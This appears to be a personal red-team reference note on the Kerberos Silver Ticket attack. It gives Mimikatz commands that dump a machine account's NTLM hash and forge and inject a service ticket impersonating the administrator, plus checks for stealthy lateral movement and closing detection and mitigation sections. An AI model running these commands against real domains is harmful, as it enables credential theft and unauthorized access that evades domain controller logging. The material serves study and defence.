+++
title = "Silver Ticket"
author = ["svejk"]
tags = ["kerberos", "activeDirectory"]
draft = false
+++

## Silver Ticket {#silver-ticket}

A Silver Ticket is a forged ****Kerberos Service Ticket (TGS)**** that allows access to a specific service without contacting a Domain Controller. It is created using the ****NTLM hash of the target service account****, often a computer account (e.g., \`HOST/\`, \`HTTP/\`).


### Overview {#overview}

-   Forged TGS for a specific service
-   Does not require communication with a Domain Controller
-   Uses the ****service account's NTLM hash****, not KRBTGT
-   Lower privilege, more stealthy than a Golden Ticket


### Prerequisites {#prerequisites}

-   SYSTEM or Administrator access on a domain-joined machine
-   Knowledge of:
    -   NTLM hash of the target service account (e.g., machine account or managed service account)
    -   SPN (Service Principal Name)
    -   Domain name &amp; FQDN
    -   Domain SID


### Key Concepts {#key-concepts}

-   **Service Ticket (TGS)**: Used to authenticate to a service (e.g., CIFS, MSSQL, HTTP)
-   **SPN**: Tied to the service account; uniquely identifies the Kerberos service
-   **Computer account NTLM hash** = used to sign TGS for that host
-   Bypasses the KDC entirely; invisible to the Domain Controller


### Mimikatz Commands {#mimikatz-commands}


#### Get NTLM Hash of the Service Account {#get-ntlm-hash-of-the-service-account}

Typically done via secretsdump.py, DCSync, or LSASS dump.

From Mimikatz (on DC or machine with SYSTEM access):

```powershell
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:TARGETHOST$
```

Look for:
NTLM: 92f8c3cbd7e9fc367ea85e3e05b47b0f


### Create and Inject Silver Ticket {#create-and-inject-silver-ticket}

```powershell
mimikatz # kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-1234567890-2345678901-3456789012 /target:targethost.corp.local /service:cifs /rc4:92f8c3cbd7e9fc367ea85e3e05b47b0f /ptt /id:500
```

Explanation:

-   \`/user\`: User to impersonate (e.g. administrator)
-   \`/domain\`: Target domain
-   \`/sid\`: Domain SID
-   \`/target\`: FQDN of the service host (e.g. \`host.corp.local\`)
-   \`/service\`: SPN prefix (e.g. \`cifs\`, \`http\`, \`mssqlsvc\`)
-   \`/rc4\`: NTLM hash of service account
-   \`/id\`: RID of impersonated user
-   \`/ptt\`: Injects ticket into memory


### Validate Access {#validate-access}

Example:

```powershell
dir \\targethost\c$
klist
whoami
```

You should now have access to the service (e.g. \`\\\host\c$\`).


## Common Target SPNs {#common-target-spns}

-   \`CIFS/host.domain\` – file shares
-   \`HTTP/host.domain\` – web apps, SharePoint
-   \`MSSQLSvc/host.domain:1433\` – SQL Server
-   \`WSMAN/host.domain\` – WinRM


## Impact {#impact}

-   Access to specific services as a forged user
-   No logs on Domain Controller (KDC not involved)
-   Great for lateral movement or persistence
-   Useful when Golden Ticket is too noisy


## Detection {#detection}

-   Service tickets without corresponding TGT issuance
-   Unusual user/service pairings
-   Tickets from nonexistent users
-   \`Event ID 4624\` logons to services with no matching \`4768/4769\` events


## Mitigation {#mitigation}

-   Use AES-only authentication (silver ticket needs RC4)
-   Rotate service account passwords regularly
-   Restrict and monitor service account privileges
-   Deploy Defender for Identity / endpoint telemetry


## References {#references}

-   <https://adsecurity.org/?p=2011>
-   <https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview>
-   <https://www.harmj0y.net/blog/redteaming/kerberos-attacks-part-2/>
